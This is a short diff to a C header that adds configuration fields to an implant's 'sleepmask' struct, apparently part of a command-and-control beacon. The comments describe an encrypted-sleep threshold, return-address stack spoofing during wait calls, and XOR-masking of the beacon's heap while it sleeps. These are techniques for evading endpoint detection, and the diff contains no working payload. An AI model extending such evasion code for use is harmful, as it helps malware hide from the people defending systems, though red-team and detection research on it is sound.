@@ -75,4 +75,16 @@ typedef struct _NAX_SM_INFO {
      * range must never include this struct itself. */
     PVOID   PrivateBase;    /* NULL = instance masking disabled */
     UINT32  PrivateLen;
+    /* P11 - encrypted-sleep threshold (ms): sleeps below this skip the P2
+     * mask/protect cycle (FOLIAGE >=1s gate; cuts VP churn on short jitter
+     * sleeps). 0 = sleepmask uses its built-in default (1000 ms). */
+    UINT32  MinSleepMs;
+    /* P5 - full-wait stack spoof enable (0/1): applies the P4 RBP-chain ret
+     * spoof across the WHOLE NtWaitForSingleObject window, not only the VP
+     * calls. No effect when SpoofReady==0 (defender lane). */
+    UINT32  WaitSpoof;
+    /* P6 - private-heap masking: beacon-owned heap handle; NULL = heap
+     * masking disabled. Busy blocks are XOR-masked with the same per-sleep
+     * key and the heap lock is held across the wait. */
+    PVOID   HeapHandle;
 } NAX_SM_INFO, *PNAX_SM_INFO;
